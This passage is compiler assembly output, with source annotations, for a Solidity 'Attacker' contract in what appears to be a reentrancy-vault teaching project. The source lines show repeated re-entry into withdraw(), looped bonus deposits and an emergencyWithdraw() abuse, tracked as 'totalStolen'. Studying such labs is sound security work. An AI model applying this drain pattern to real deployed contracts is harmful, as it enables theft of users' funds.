tag_39\n      mload(0x40)\n      dup1\n      0x60\n      add\n      0x40\n      mstore\n      dup1\n      0x24\n      dup2\n      mstore\n      0x20\n      add\n      data_895220160cc01848bad383f1fe3fa26171c49796af7f42ec0ab7a1191b347ff4\n      0x24\n      swap2\n      codecopy\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3842:3853  console.log */\n      tag_17\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3842:3893  console.log(\"   - LLAMANDO withdraw() NUEVAMENTE!\") */\n      jump\t// in\n    tag_39:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3920:3925  vault */\n      sload(0x00)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3920:3945  vault.withdraw(msg.value) */\n      mload(0x40)\n      shl(0xe0, 0x2e1a7d4d)\n      dup2\n      mstore\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3935:3944  msg.value */\n      callvalue\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3920:3945  vault.withdraw(msg.value) */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":815:840   */\n      mstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3920:3925  vault */\n      swap1\n      swap2\n      and\n      swap1\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3920:3934  vault.withdraw */\n      0x2e1a7d4d\n      swap1\n        /* \"#utility.yul\":788:806   */\n      0x24\n      add\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3920:3945  vault.withdraw(msg.value) */\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_42\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_42:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_44\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_44:\n      pop\n      pop\n      pop\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":3490:3956  if (attackCount < 5 && address(vault).balance >= msg.value) {... */\n    tag_34:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4088:4089  3 */\n      0x03\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4074:4085  attackCount */\n      sload(0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4074:4089  attackCount < 3 */\n      lt\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4074:4125  attackCount < 3 && address(this).balance >= 1 ether */\n      dup1\n      iszero\n      tag_45\n      jumpi\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4118:4125  1 ether */\n      0x0de0b6b3a7640000\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4093:4114  address(this).balance */\n      selfbalance\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4093:4125  address(this).balance >= 1 ether */\n      lt\n      iszero\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4074:4125  attackCount < 3 && address(this).balance >= 1 ether */\n    tag_45:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4070:4474  if (attackCount < 3 && address(this).balance >= 1 ether) {... */\n      iszero\n      tag_46\n      jumpi\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4141:4203  console.log(\"BREAKPOINT ATTACKER - Explotando deposit bonus:\") */\n      tag_47\n      mload(0x40)\n      dup1\n      0x60\n      add\n      0x40\n      mstore\n      dup1\n      0x2f\n      dup2\n      mstore\n      0x20\n      add\n      data_885d769aa29e598a69ca240c30da87d65d1286fd28a69b8127485636d377220a\n      0x2f\n      swap2\n      codecopy\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4141:4152  console.log */\n      tag_17\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4141:4203  console.log(\"BREAKPOINT ATTACKER - Explotando deposit bonus:\") */\n      jump\t// in\n    tag_47:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4217:4263  console.log(\"   - Attack count:\", attackCount) */\n      tag_48\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x12\n      dup2\n      mstore\n      0x20\n      add\n      shl(0x71, 0x101010169020ba3a30b1b59031b7bab73a1d)\n      dup2\n      mstore\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4251:4262  attackCount */\n      sload(0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4217:4228  console.log */\n      tag_19\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4217:4263  console.log(\"   - Attack count:\", attackCount) */\n      jump\t// in\n    tag_48:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4277:4341  console.log(\"   - Balance del attacker:\", address(this).balance) */\n      tag_49\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x1a\n      dup2\n      mstore\n      0x20\n      add\n      0x2020202d2042616c616e63652064656c2061747461636b65723a000000000000\n      dup2\n      mstore\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4319:4340  address(this).balance */\n      selfbalance\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4277:4288  console.log */\n      tag_19\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4277:4341  console.log(\"   - Balance del attacker:\", address(this).balance) */\n      jump\t// in\n    tag_49:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4355:4405  console.log(\"   - LLAMANDO deposit() NUEVAMENTE!\") */\n      tag_50\n      mload(0x40)\n      dup1\n      0x60\n      add\n      0x40\n      mstore\n      dup1\n      0x23\n      dup2\n      mstore\n      0x20\n      add\n      data_4dd9b442acf3e8cc560e1a32f9bcf3c7d0c097a5052e406aee2fd0e831e11b08\n      0x23\n      swap2\n      codecopy\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4355:4366  console.log */\n      tag_17\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4355:4405  console.log(\"   - LLAMANDO deposit() NUEVAMENTE!\") */\n      jump\t// in\n    tag_50:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4432:4437  vault */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4432:4445  vault.deposit */\n      and\n      0xd0e30db0\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4453:4460  1 ether */\n      0x0de0b6b3a7640000\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4432:4463  vault.deposit{value: 1 ether}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_51\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_51:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_53\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_53:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4070:4474  if (attackCount < 3 && address(this).balance >= 1 ether) {... */\n    tag_46:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":442:5432  contract Attacker is IAttacker {... */\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4921:5079  function getAttackStats() external view override returns (uint256, uint256, uint256) {... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_54\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_54:\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":5024:5035  attackCount */\n      sload(0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":5037:5048  totalStolen */\n      sload(0x02)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":5050:5071  address(this).balance */\n      selfbalance\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4921:5079  function getAttackStats() external view override returns (uint256, uint256, uint256) {... */\n      0x40\n      dup1\n      mload\n        /* \"#utility.yul\":1053:1078   */\n      swap4\n      dup5\n      mstore\n        /* \"#utility.yul\":1109:1111   */\n      0x20\n        /* \"#utility.yul\":1094:1112   */\n      dup5\n      add\n        /* \"#utility.yul\":1087:1121   */\n      swap3\n      swap1\n      swap3\n      mstore\n        /* \"#utility.yul\":1137:1155   */\n      swap1\n      dup3\n      add\n        /* \"#utility.yul\":1130:1164   */\n      mstore\n        /* \"#utility.yul\":1041:1043   */\n      0x60\n        /* \"#utility.yul\":1026:1044   */\n      add\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4921:5079  function getAttackStats() external view override returns (uint256, uint256, uint256) {... */\n    tag_57:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":5303:5430  function getVaultUserBalance() external view override returns (uint256) {... */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_59\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_59:\n      pop\n      tag_60\n      tag_61\n      jump\t// in\n    tag_60:\n      mload(0x40)\n        /* \"#utility.yul\":815:840   */\n      swap1\n      dup2\n      mstore\n        /* \"#utility.yul\":803:805   */\n      0x20\n        /* \"#utility.yul\":788:806   */\n      add\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":5303:5430  function getVaultUserBalance() external view override returns (uint256) {... */\n      tag_57\n        /* \"#utility.yul\":669:846   */\n      jump\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":513:548  uint256 public override attackCount */\n    tag_5:\n      callvalue\n      dup1\n      iszero\n      tag_63\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_63:\n      pop\n      tag_60\n      sload(0x01)\n      dup2\n      jump\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1695:2031  function attackDepositBonus() external payable override {... */\n    tag_6:\n      tag_46\n      tag_68\n      jump\t// in\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2085:2512  function attackEmergencyWithdraw() external payable override {... */\n    tag_7:\n      tag_46\n      tag_70\n      jump\t// in\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":722:1645  function attack() external payable override {... */\n    tag_8:\n      tag_46\n      tag_72\n      jump\t// in\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":554:589  uint256 public override totalStolen */\n    tag_9:\n      callvalue\n      dup1\n      iszero\n      tag_73\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_73:\n      pop\n      tag_60\n      sload(0x02)\n      dup2\n      jump\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":5126:5244  function getVaultBalance() external view override returns (uint256) {... */\n    tag_10:\n      callvalue\n      dup1\n      iszero\n      tag_77\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_77:\n      pop\n      tag_60\n      tag_79\n      jump\t// in\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":479:507  VulnerableVault public vault */\n    tag_11:\n      callvalue\n      dup1\n      iszero\n      tag_81\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_81:\n      pop\n      sload(0x00)\n      tag_82\n      swap1\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      dup2\n      jump\n    tag_82:\n      mload(0x40)\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"#utility.yul\":1372:1404   */\n      swap1\n      swap2\n      and\n        /* \"#utility.yul\":1354:1405   */\n      dup2\n      mstore\n        /* \"#utility.yul\":1342:1344   */\n      0x20\n        /* \"#utility.yul\":1327:1345   */\n      add\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":479:507  VulnerableVault public vault */\n      tag_57\n        /* \"#utility.yul\":1175:1411   */\n      jump\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4529:4870  function withdrawStolenFunds() external override {... */\n    tag_12:\n      callvalue\n      dup1\n      iszero\n      tag_86\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_86:\n      pop\n      tag_46\n      tag_88\n      jump\t// in\n        /* \"lib/forge-std/src/console.sol\":6191:6312  function log(string memory p0) internal pure {... */\n    tag_17:\n        /* \"lib/forge-std/src/console.sol\":6246:6305  _sendLogPayload(abi.encodeWithSignature(\"log(string)\", p0)) */\n      tag_90\n        /* \"lib/forge-std/src/console.sol\":6301:6303  p0 */\n      dup2\n        /* \"lib/forge-std/src/console.sol\":6262:6304  abi.encodeWithSignature(\"log(string)\", p0) */\n      add(0x24, mload(0x40))\n      tag_91\n      swap2\n      swap1\n      tag_92\n      jump\t// in\n    tag_91:\n      0x40\n      dup1\n      mload\n      not(0x1f)\n      dup2\n      dup5\n      sub\n      add\n      dup2\n      mstore\n      swap2\n      swap1\n      mstore\n      0x20\n      dup2\n      add\n      dup1\n      mload\n      sub(shl(0xe0, 0x01), 0x01)\n      and\n      shl(0xe2, 0x104c13eb)\n      or\n      swap1\n      mstore\n        /* \"lib/forge-std/src/console.sol\":6246:6261  _sendLogPayload */\n      tag_93\n        /* \"lib/forge-std/src/console.sol\":6246:6305  _sendLogPayload(abi.encodeWithSignature(\"log(string)\", p0)) */\n      jump\t// in\n    tag_90:\n        /* \"lib/forge-std/src/console.sol\":6191:6312  function log(string memory p0) internal pure {... */\n      pop\n      jump\t// out\n        /* \"lib/forge-std/src/console.sol\":7139:7284  function log(string memory p0, uint256 p1) internal pure {... */\n    tag_19:\n        /* \"lib/forge-std/src/console.sol\":7206:7277  _sendLogPayload(abi.encodeWithSignature(\"log(string,uint256)\", p0, p1)) */\n      tag_95\n        /* \"lib/forge-std/src/console.sol\":7269:7271  p0 */\n      dup3\n        /* \"lib/forge-std/src/console.sol\":7273:7275  p1 */\n      dup3\n        /* \"lib/forge-std/src/console.sol\":7222:7276  abi.encodeWithSignature(\"log(string,uint256)\", p0, p1) */\n      add(0x24, mload(0x40))\n      tag_96\n      swap3\n      swap2\n      swap1\n      tag_97\n      jump\t// in\n    tag_96:\n      0x40\n      dup1\n      mload\n      not(0x1f)\n      dup2\n      dup5\n      sub\n      add\n      dup2\n      mstore\n      swap2\n      swap1\n      mstore\n      0x20\n      dup2\n      add\n      dup1\n      mload\n      sub(shl(0xe0, 0x01), 0x01)\n      and\n      shl(0xe2, 0x2d839cb3)\n      or\n      swap1\n      mstore\n        /* \"lib/forge-std/src/console.sol\":7206:7221  _sendLogPayload */\n      tag_93\n        /* \"lib/forge-std/src/console.sol\":7206:7277  _sendLogPayload(abi.encodeWithSignature(\"log(string,uint256)\", p0, p1)) */\n      jump\t// in\n    tag_95:\n        /* \"lib/forge-std/src/console.sol\":7139:7284  function log(string memory p0, uint256 p1) internal pure {... */\n      pop\n      pop\n      jump\t// out\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":5303:5430  function getVaultUserBalance() external view override returns (uint256) {... */\n    tag_61:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":5366:5373  uint256 */\n      0x00\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":5392:5397  vault */\n      dup1\n      sload\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":5392:5423  vault.getBalance(address(this)) */\n      mload(0x40)\n      shl(0xe0, 0xf8b2cb4f)\n      dup2\n      mstore\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":5417:5421  this */\n      address\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":5392:5423  vault.getBalance(address(this)) */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":1354:1405   */\n      mstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":5392:5397  vault */\n      swap1\n      swap2\n      and\n      swap1\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":5392:5408  vault.getBalance */\n      0xf8b2cb4f\n      swap1\n        /* \"#utility.yul\":1327:1345   */\n      0x24\n      add\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":5392:5423  vault.getBalance(address(this)) */\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_103\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_103:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_104\n      swap2\n      swap1\n      tag_105\n      jump\t// in\n    tag_104:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":5385:5423  return vault.getBalance(address(this)) */\n      swap1\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":5303:5430  function getVaultUserBalance() external view override returns (uint256) {... */\n      swap1\n      jump\t// out\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1695:2031  function attackDepositBonus() external payable override {... */\n    tag_68:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1782:1789  1 ether */\n      0x0de0b6b3a7640000\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1769:1778  msg.value */\n      callvalue\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1769:1789  msg.value >= 1 ether */\n      lt\n      iszero\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1761:1813  require(msg.value >= 1 ether, \"Need at least 1 ETH\") */\n      tag_107\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":2964:2966   */\n      0x20\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1761:1813  require(msg.value >= 1 ether, \"Need at least 1 ETH\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":2946:2967   */\n      mstore\n        /* \"#utility.yul\":3003:3005   */\n      0x13\n        /* \"#utility.yul\":2983:3001   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":2976:3006   */\n      mstore\n      shl(0x6b, 0x09ccacac840c2e840d8cac2e6e84062408aa89)\n        /* \"#utility.yul\":3022:3040   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":3015:3064   */\n      mstore\n        /* \"#utility.yul\":3081:3099   */\n      0x64\n      add\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1761:1813  require(msg.value >= 1 ether, \"Need at least 1 ETH\") */\n    tag_108:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_107:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1832:1873  console.log(\"Attacking deposit bonus...\") */\n      tag_110\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x1a\n      dup2\n      mstore\n      0x20\n      add\n      0x41747461636b696e67206465706f73697420626f6e75732e2e2e000000000000\n      dup2\n      mstore\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1832:1843  console.log */\n      tag_17\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1832:1873  console.log(\"Attacking deposit bonus...\") */\n      jump\t// in\n    tag_110:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1941:1946  vault */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1941:1954  vault.deposit */\n      and\n      0xd0e30db0\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1962:1971  msg.value */\n      callvalue\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1941:1974  vault.deposit{value: msg.value}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_111\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_111:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_113\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_113:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1993:2024  console.log(\"Bonus exploited!\") */\n      tag_114\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x10\n      dup2\n      mstore\n      0x20\n      add\n      shl(0x80, 0x426f6e7573206578706c6f6974656421)\n      dup2\n      mstore\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1993:2004  console.log */\n      tag_17\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1993:2024  console.log(\"Bonus exploited!\") */\n      jump\t// in\n    tag_114:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1695:2031  function attackDepositBonus() external payable override {... */\n      jump\t// out\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2085:2512  function attackEmergencyWithdraw() external payable override {... */\n    tag_70:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2176:2177  0 */\n      0x00\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2164:2173  msg.value */\n      callvalue\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2164:2177  msg.value > 0 */\n      gt\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2156:2200  require(msg.value > 0, \"Need ETH to attack\") */\n      tag_116\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":3312:3314   */\n      0x20\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2156:2200  require(msg.value > 0, \"Need ETH to attack\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":3294:3315   */\n      mstore\n        /* \"#utility.yul\":3351:3353   */\n      0x12\n        /* \"#utility.yul\":3331:3349   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":3324:3354   */\n      mstore\n      shl(0x70, 0x4e6565642045544820746f2061747461636b)\n        /* \"#utility.yul\":3370:3388   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":3363:3411   */\n      mstore\n        /* \"#utility.yul\":3428:3446   */\n      0x64\n      add\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2156:2200  require(msg.value > 0, \"Need ETH to attack\") */\n      tag_108\n        /* \"#utility.yul\":3110:3452   */\n      jump\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2156:2200  require(msg.value > 0, \"Need ETH to attack\") */\n    tag_116:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2219:2264  console.log(\"Attacking emergencyWithdraw...\") */\n      tag_119\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x1e\n      dup2\n      mstore\n      0x20\n      add\n      0x41747461636b696e6720656d657267656e637957697468647261772e2e2e0000\n      dup2\n      mstore\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2219:2230  console.log */\n      tag_17\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2219:2264  console.log(\"Attacking emergencyWithdraw...\") */\n      jump\t// in\n    tag_119:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2328:2333  vault */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2328:2341  vault.deposit */\n      and\n      0xd0e30db0\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2349:2358  msg.value */\n      callvalue\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2328:2361  vault.deposit{value: msg.value}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_120\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_120:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_122\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_122:\n      pop\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2417:2422  vault */\n      0x00\n      dup1\n      sload\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2417:2442  vault.emergencyWithdraw() */\n      0x40\n      dup1\n      mload\n      shl(0xe2, 0x36cb886f)\n      dup2\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2417:2422  vault */\n      swap1\n      swap3\n      and\n      swap6\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2417:2440  vault.emergencyWithdraw */\n      0xdb2e21bc\n      swap5\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2417:2442  vault.emergencyWithdraw() */\n      0x04\n      dup1\n      dup3\n      add\n      swap5\n      pop\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2417:2422  vault */\n      dup4\n      dup8\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2417:2442  vault.emergencyWithdraw() */\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_123\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_123:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_125\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_125:\n      pop\n      pop\n      pop\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2461:2505  console.log(\"Emergency withdraw exploited!\") */\n      tag_114\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x1d\n      dup2\n      mstore\n      0x20\n      add\n      0x456d657267656e6379207769746864726177206578706c6f6974656421000000\n      dup2\n      mstore\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2461:2472  console.log */\n      tag_17\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":2461:2505  console.log(\"Emergency withdraw exploited!\") */\n      jump\t// in\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":722:1645  function attack() external payable override {... */\n    tag_72:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":796:797  0 */\n      0x00\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":784:793  msg.value */\n      callvalue\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":784:797  msg.value > 0 */\n      gt\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":776:820  require(msg.value > 0, \"Need ETH to attack\") */\n      tag_128\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":3312:3314   */\n      0x20\n        /* 